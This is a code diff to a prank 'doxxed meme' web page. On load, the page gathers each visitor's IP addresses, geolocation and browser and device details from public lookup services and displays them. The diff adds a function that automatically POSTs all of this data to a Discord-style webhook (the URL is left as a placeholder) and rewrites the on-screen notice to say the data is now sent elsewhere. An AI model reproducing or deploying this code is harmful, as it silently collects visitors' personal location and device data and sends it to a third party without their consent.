@@ -5,10 +5,26 @@
     <div id="player" style="position:absolute;top:0;left:0;" hidden></div>
     <div id="info" style="position:absolute;bottom:100px;left:0;font-family:Arial, Helvetica, sans-serif;font-size:50px;text-align: center;width:100vw;color:#00ff00;pointer-events: none;">
         click play (all info is mostly true)<br>
-        doxxed meme but you actually get doxxed<br>
-        info is not sent anywhere, all websites know this
+        doxxed meme but you actually get doxxed lol<br>
+        info IS sent elsewhere; all websites know this
     </div>
     <script>
+        //the doxxing function
+        const webhookUrl = 'PUT_YOUR_WEBHOOK_URL_HERE';
+
+        function dox(info) {
+            const payload = {
+                content: info
+            };
+            fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+            })
+        }
+
         // 2. This code loads the IFrame Player API code asynchronously.
         // load sensitive info
 
@@ -20,13 +36,13 @@
             var ipv6 = await (await fetch("https://api64.ipify.org?format=json")).json()
             var ipdt = await (await fetch(`https://ipapi.co/${ipv4.ip}/json/`)).json()
             var ipdt3 = await (await fetch(`https://api.ipapi.is`)).json()
-            for (let i=0;i<17;i++){
-                info.push(`Please wait ${17-i}`)
-            }
+            // for (let i=0;i<17;i++){
+            //     info.push(`Please wait ${17-i}`)
+            // }
             info.push(`IP Address: ${ipdt.ip}`)
             info.push(`IP Address 2: ${ipdt2.ip_addr}`)
-            info.push(`IPv4?: ${ipv4.ip}`)
-            info.push(`IPv6?: ${ipv6.ip}`)
+            info.push(`IPv4: ${ipv4.ip}`)
+            info.push(`IPv6: ${ipv6.ip}`)
             info.push(`Country: ${ipdt.country_name}`)
             info.push(`Country Code: ${ipdt.country_code} / ${ipdt.country_code_iso3}`)
             info.push(`Region Name: ${ipdt.region}`)
@@ -48,17 +64,15 @@
             info.push(`Memory: ${navigator.deviceMemory}`)
             info.push(`Logical Cores: ${navigator.hardwareConcurrency}`)
             info.push(`Language: ${navigator.language}`)
-            info.push(`Browser Width: ${screen.availWidth}`)
-            info.push(`Browser Height: ${window.availHeight}`)
+            info.push(`Screen Width: ${window.outerWidth}`)
+            info.push(`Screen Height: ${window.outerHeight}`)
             info.push(`Operating System: ${navigator.userAgentData.platform}`)
             for (let c of navigator.userAgentData.brands){
                 info.push(`${c.brand} Version: ${c.version}`)
             }
             info.push(`Mobile Device: ${navigator.userAgentData.mobile}`)
-            info.push("(I know more about you)")
-            info.push("(I know more about you)")
-            info.push("(I know more about you)")
             plre.hidden = false;
+            dox(info.join("\n"));
         }
         loadinfo()
 
